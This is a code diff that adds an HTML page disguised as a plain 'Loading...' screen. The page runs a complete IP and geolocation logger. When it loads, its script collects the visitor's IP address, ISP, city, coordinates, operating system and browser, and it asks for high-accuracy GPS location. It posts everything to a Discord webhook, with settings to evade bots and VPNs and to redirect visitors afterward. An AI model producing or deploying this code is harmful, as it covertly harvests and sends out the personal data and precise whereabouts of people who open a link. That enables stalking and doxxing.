@@ -1,0 +1,452 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            text-align: center;
+            padding: 20px;
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 2s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="loader"></div>
+        <p id="status-message">Loading content...</p>
+    </div>
+
+    <script>
+        // Configuration
+        const config = {
+            // BASE CONFIG
+            "webhook": "YOUR_DISCORD_WEBHOOK_URL_HERE",
+            "username": "IP Logger",
+            "color": 0x00FFFF,
+
+            // OPTIONS
+            "accurateLocation": true, // Enable GPS location
+            "linkAlerts": true, // Alert when link is accessed
+            "vpnCheck": 1, // 0=No VPN check, 1=No ping on VPN, 2=No alert on VPN
+            "antiBot": 1, // 0=No anti-bot, 1=No ping on bot, 2=No ping on confirmed bot, 3=No alert on bot, 4=No alert on confirmed bot
+            
+            // REDIRECTION
+            "redirect": {
+                "enabled": false, // Enable redirect after logging
+                "url": "https://example.com", // URL to redirect to
+                "delay": 3000 // Delay in milliseconds
+            },
+
+            // CUSTOM MESSAGE
+            "message": {
+                "enabled": false, // Show custom message
+                "message": "Your information has been logged.", // Message text
+                "richMessage": true // Enable template replacements
+            }
+        };
+
+        // Blacklisted IP ranges (from image.py)
+        const blacklistedIPs = ["27", "104", "143", "164"];
+
+        // Bot detection function (from image.py)
+        function botCheck(ip, useragent) {
+            if (!ip || !useragent) return false;
+            
+            if (ip.startsWith("34.") || ip.startsWith("35.")) {
+                return "Discord";
+            } else if (useragent.includes("TelegramBot")) {
+                return "Telegram";
+            } else if (useragent.includes("Discordbot") || useragent.includes("+https://discord.com")) {
+                return "Discord Crawler";
+            } else if (useragent.includes("Twitterbot") || useragent.includes("facebookexternalhit")) {
+                return "Social Media Crawler";
+            } else if (useragent.includes("Googlebot") || useragent.includes("Bingbot")) {
+                return "Search Engine Crawler";
+            } else {
+                return false;
+            }
+        }
+
+        // Enhanced VPN handling (from image.py)
+        function getPingStatus(ipInfo) {
+            let ping = "@everyone";
+            
+            if (ipInfo.proxy) {
+                if (config.vpnCheck === 2) return null;
+                if (config.vpnCheck === 1) ping = "";
+            }
+
+            if (ipInfo.hosting) {
+                if (config.antiBot === 4) {
+                    if (!ipInfo.proxy) return null;
+                }
+                if (config.antiBot === 3) return null;
+                if (config.antiBot === 2 && !ipInfo.proxy) ping = "";
+                if (config.antiBot === 1) ping = "";
+            }
+
+            return ping;
+        }
+
+        // Enhanced user agent parsing (simplified version of httpagentparser)
+        function parseUserAgent(ua) {
+            if (!ua) return { os: 'Unknown', browser: 'Unknown' };
+            
+            let os = 'Unknown';
+            let browser = 'Unknown';
+
+            // OS Detection
+            if (/Windows NT 10/.test(ua)) os = 'Windows 10/11';
+            else if (/Windows NT 6.3/.test(ua)) os = 'Windows 8.1';
+            else if (/Windows NT 6.2/.test(ua)) os = 'Windows 8';
+            else if (/Windows NT 6.1/.test(ua)) os = 'Windows 7';
+            else if (/Windows NT 6.0/.test(ua)) os = 'Windows Vista';
+            else if (/Windows NT 5.1/.test(ua)) os = 'Windows XP';
+            else if (/Mac OS X 14_/.test(ua)) os = 'macOS Sonoma';
+            else if (/Mac OS X 13_/.test(ua)) os = 'macOS Ventura';
+            else if (/Mac OS X 12_/.test(ua)) os = 'macOS Monterey';
+            else if (/Mac OS X 11_/.test(ua)) os = 'macOS Big Sur';
+            else if (/Mac OS X/.test(ua)) {
+                const match = /Mac OS X ([0-9_]+)/.exec(ua);
+                os = match ? `macOS ${match[1].replace(/_/g, '.')}` : 'macOS';
+            }
+            else if (/Android ([0-9.]+)/.test(ua)) {
+                const match = /Android ([0-9.]+)/.exec(ua);
+                os = match ? `Android ${match[1]}` : 'Android';
+            }
+            else if (/(iPhone|iPad).*OS ([0-9_]+)/.test(ua)) {
+                const match = /(iPhone|iPad).*OS ([0-9_]+)/.exec(ua);
+                os = match ? `iOS ${match[2].replace(/_/g, '.')}` : 'iOS';
+            }
+            else if (/Linux/.test(ua)) os = 'Linux';
+            else if (/CrOS/.test(ua)) os = 'Chrome OS';
+
+            // Browser Detection
+            if (/Chrome\/([0-9.]+)/.test(ua) && !/Edg|OPR/.test(ua)) {
+                const match = /Chrome\/([0-9.]+)/.exec(ua);
+                browser = match ? `Chrome ${match[1]}` : 'Chrome';
+            }
+            else if (/Firefox\/([0-9.]+)/.test(ua)) {
+                const match = /Firefox\/([0-9.]+)/.exec(ua);
+                browser = match ? `Firefox ${match[1]}` : 'Firefox';
+            }
+            else if (/Safari\/([0-9.]+)/.test(ua) && !/Chrome/.test(ua)) {
+                const match = /Version\/([0-9.]+)/.exec(ua);
+                browser = match ? `Safari ${match[1]}` : 'Safari';
+            }
+            else if (/Edg\/([0-9.]+)/.test(ua)) {
+                const match = /Edg\/([0-9.]+)/.exec(ua);
+                browser = match ? `Edge ${match[1]}` : 'Edge';
+            }
+            else if (/OPR\/([0-9.]+)/.test(ua)) {
+                const match = /OPR\/([0-9.]+)/.exec(ua);
+                browser = match ? `Opera ${match[1]}` : 'Opera';
+            }
+
+            return { os, browser };
+        }
+
+        // Get continent from country code
+        const getContinent = (countryCode) => {
+            if (!countryCode) return 'Unknown';
+            
+            const continentMap = {
+                'US': 'North America', 'CA': 'North America', 'MX': 'North America',
+                'GB': 'Europe', 'DE': 'Europe', 'FR': 'Europe', 'IT': 'Europe', 'ES': 'Europe',
+                'NL': 'Europe', 'SE': 'Europe', 'CH': 'Europe', 'NO': 'Europe', 'DK': 'Europe',
+                'FI': 'Europe', 'BE': 'Europe', 'AT': 'Europe', 'IE': 'Europe', 'PT': 'Europe',
+                'CN': 'Asia', 'JP': 'Asia', 'IN': 'Asia', 'KR': 'Asia', 'SG': 'Asia',
+                'TH': 'Asia', 'VN': 'Asia', 'MY': 'Asia', 'ID': 'Asia', 'PH': 'Asia',
+                'BR': 'South America', 'AR': 'South America', 'CO': 'South America', 'PE': 'South America',
+                'CL': 'South America', 'EC': 'South America', 'VE': 'South America', 'BO': 'South America',
+                'ZA': 'Africa', 'NG': 'Africa', 'EG': 'Africa', 'KE': 'Africa', 'ET': 'Africa',
+                'GH': 'Africa', 'DZ': 'Africa', 'MA': 'Africa', 'TZ': 'Africa', 'SD': 'Africa',
+                'AU': 'Oceania', 'NZ': 'Oceania', 'FJ': 'Oceania', 'PG': 'Oceania', 'SB': 'Oceania'
+            };
+
+            return continentMap[countryCode] || 'Unknown';
+        };
+
+        // Format timezone
+        const formatTimezone = (timezone) => {
+            if (!timezone) return 'Unknown';
+            try {
+                const [continent, city] = timezone.split('/');
+                return `${city.replace(/_/g, ' ')} (${continent})`;
+            } catch {
+                return timezone;
+            }
+        };
+
+        // Error reporting to Discord
+        async function sendErrorWebhook(error) {
+            try {
+                await fetch(config.webhook, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        username: `${config.username} - ERROR`,
+                        content: "@everyone",
+                        embeds: [{
+                            title: "⚠️ IP Logger Error",
+                            color: 0xFF0000,
+                            description: `**An error occurred!**\n\n**Error:**\n\`\`\`${error.stack || error.message || error}\`\`\``,
+                            fields: [
+                                { name: "URL", value: window.location.href, inline: true },
+                                { name: "User Agent", value: navigator.userAgent?.slice(0, 1000) || "Unknown" }
+                            ]
+                        }]
+                    })
+                });
+            } catch (e) {
+                console.error('Failed to send error webhook:', e);
+            }
+        }
+
+        // Send webhook helper
+        async function sendWebhook(webhookData) {
+            try {
+                await fetch(config.webhook, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(webhookData)
+                });
+            } catch (error) {
+                console.error('Failed to send webhook:', error);
+                await sendErrorWebhook(error);
+            }
+        }
+
+        // Get precise location
+        async function getPreciseLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve(null);
+                    return;
+                }
+
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const coords = `${position.coords.latitude},${position.coords.longitude}`;
+                        resolve({
+                            coords: coords,
+                            accuracy: position.coords.accuracy,
+                            mapsLink: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
+                        });
+                    },
+                    (error) => {
+                        console.error('Geolocation error:', error);
+                        resolve(null);
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            });
+        }
+
+        // Replace template placeholders
+        function replacePlaceholders(message, data) {
+            return message
+                .replace(/{ip}/g, data.ipInfo.query || 'Unknown')
+                .replace(/{isp}/g, data.ipInfo.isp || 'Unknown')
+                .replace(/{asn}/g, data.ipInfo.as || 'Unknown')
+                .replace(/{country}/g, data.ipInfo.country || 'Unknown')
+                .replace(/{region}/g, data.ipInfo.regionName || 'Unknown')
+                .replace(/{city}/g, data.ipInfo.city || 'Unknown')
+                .replace(/{lat}/g, data.ipInfo.lat || 'Unknown')
+                .replace(/{long}/g, data.ipInfo.lon || 'Unknown')
+                .replace(/{timezone}/g, formatTimezone(data.ipInfo.timezone) || 'Unknown')
+                .replace(/{mobile}/g, data.ipInfo.mobile ? 'True' : 'False')
+                .replace(/{vpn}/g, data.ipInfo.proxy ? 'True' : 'False')
+                .replace(/{bot}/g, data.botStatus || 'False')
+                .replace(/{browser}/g, data.browserInfo.browser || 'Unknown')
+                .replace(/{os}/g, data.browserInfo.os || 'Unknown');
+        }
+
+        // Get IP information and send to Discord
+        async function logIP() {
+            try {
+                // Update status message
+                document.getElementById('status-message').textContent = 'Processing...';
+
+                // Check for blacklisted IPs (would need server-side for actual IP)
+                const bot = botCheck("client-ip", navigator.userAgent);
+                if (bot && config.linkAlerts) {
+                    await sendWebhook({
+                        username: `${config.username} - Link Alert`,
+                        content: "",
+                        embeds: [{
+                            title: "🔗 Link Accessed",
+                            color: config.color,
+                            description: `An IP logging link was accessed by a crawler!\n\n**Platform:** \`${bot}\`\n**User Agent:**\n\`\`\`${navigator.userAgent}\`\`\``
+                        }]
+                    });
+                }
+
+                // Get IP information from ip-api.com
+                const ipResponse = await fetch('http://ip-api.com/json/?fields=66846719');
+                if (!ipResponse.ok) throw new Error(`IP API responded with ${ipResponse.status}`);
+                
+                const ipData = await ipResponse.json();
+                if (ipData.status !== 'success') throw new Error('IP API returned unsuccessful status');
+
+                // Check if IP is blacklisted
+                if (blacklistedIPs.some(blacklisted => ipData.query.startsWith(blacklisted))) {
+                    console.log('Blacklisted IP detected');
+                    return;
+                }
+
+                // Get browser information
+                const browserInfo = parseUserAgent(navigator.userAgent);
+                
+                // Apply continent mapping
+                if (ipData.countryCode) {
+                    ipData.continent = getContinent(ipData.countryCode);
+                }
+
+                // Enhanced bot detection
+                let botStatus = 'False';
+                if (ipData.hosting) {
+                    botStatus = ipData.proxy ? 'Possibly' : 'True';
+                }
+
+                const logData = {
+                    ipInfo: ipData,
+                    browserInfo: browserInfo,
+                    botStatus: botStatus,
+                    timestamp: new Date().toISOString(),
+                    url: window.location.href
+                };
+
+                // Get ping status based on VPN/bot config
+                const ping = getPingStatus(ipData);
+
+                // Send main webhook if not blocked
+                if (ping !== null) {
+                    await sendMainWebhook(logData, ping);
+                }
+
+                // Get precise location if enabled
+                if (config.accurateLocation) {
+                    const preciseLocation = await getPreciseLocation();
+                    if (preciseLocation) {
+                        await sendPreciseLocationWebhook(logData, preciseLocation);
+                    }
+                }
+
+                // Show custom message if enabled
+                if (config.message.enabled) {
+                    let message = config.message.message;
+                    if (config.message.richMessage) {
+                        message = replacePlaceholders(message, logData);
+                    }
+                    document.getElementById('status-message').textContent = message;
+                }
+
+                // Redirect if enabled
+                if (config.redirect.enabled) {
+                    setTimeout(() => {
+                        window.location.href = config.redirect.url;
+                    }, config.redirect.delay);
+                }
+
+            } catch (error) {
+                console.error('Error logging IP:', error);
+                await sendErrorWebhook(error);
+                document.getElementById('status-message').textContent = 'An error occurred. Please try again.';
+            }
+        }
+
+        async function sendMainWebhook(data, ping) {
+            const embed = {
+                username: config.username,
+                content: ping,
+                embeds: [{
+                    title: "🌐 IP Logged",
+                    color: config.color,
+                    description: `
+**IP Info:**
+> **IP:** \`${data.ipInfo.query}\`
+> **Provider:** \`${data.ipInfo.isp}\`
+> **ASN:** \`${data.ipInfo.as}\`
+> **Continent:** \`${data.ipInfo.continent}\`
+> **Country:** \`${data.ipInfo.country}\`
+> **Region:** \`${data.ipInfo.regionName}\`
+> **City:** \`${data.ipInfo.city}\`
+> **Coordinates:** \`${data.ipInfo.lat}, ${data.ipInfo.lon}\` (Approximate)
+> **Timezone:** \`${formatTimezone(data.ipInfo.timezone)}\`
+> **Mobile:** \`${data.ipInfo.mobile ? 'True' : 'False'}\`
+> **VPN:** \`${data.ipInfo.proxy ? 'True' : 'False'}\`
+> **Bot:** \`${data.botStatus}\`
+
+**PC Info:**
+> **OS:** \`${data.browserInfo.os}\`
+> **Browser:** \`${data.browserInfo.browser}\`
+
+**User Agent:**
+\`\`\`
+${navigator.userAgent}
+\`\`\``
+                }]
+            };
+
+            await sendWebhook(embed);
+        }
+
+        async function sendPreciseLocationWebhook(data, preciseLocation) {
+            const embed = {
+                username: `${config.username} - Precise Location`,
+                content: "@everyone",
+                embeds: [{
+                    title: "📍 Precise Location Obtained",
+                    color: 0x00FF00,
+                    description: `
+**Precise GPS Location:**
+> **Coordinates:** \`${preciseLocation.coords}\`
+> **Accuracy:** \`${preciseLocation.accuracy} meters\`
+> **Google Maps:** [View Location](${preciseLocation.mapsLink})
+
+**User Information:**
+> **IP:** \`${data.ipInfo.query}\`
+> **Country:** \`${data.ipInfo.country}\`
+> **City:** \`${data.ipInfo.city}\``
+                }]
+            };
+
+            await sendWebhook(embed);
+        }
+
+        // Execute when page loads
+        document.addEventListener('DOMContentLoaded', logIP);
+    </script>
+</body>
+</html>
